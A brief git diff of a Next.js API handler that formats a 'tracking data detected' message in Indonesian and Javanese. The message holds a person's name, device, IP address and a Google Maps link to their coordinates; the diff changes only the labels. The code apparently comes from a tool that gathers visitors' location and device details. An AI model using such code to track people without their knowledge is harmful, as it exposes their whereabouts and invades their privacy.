@@ -15,9 +15,9 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
   const message = `
-📥 *Data Pelacakan Terdeteksi*
+📥 *Mass enek...Data Pelacakan Terdeteksi*
 
-👤 *Nama:* ${nama}
+👤 *Jeneng:* ${nama}
 🖥️ *Perangkat:* ${userAgent}
 🌐 *IP Address:* ${ip}
 📍 *Lokasi:*
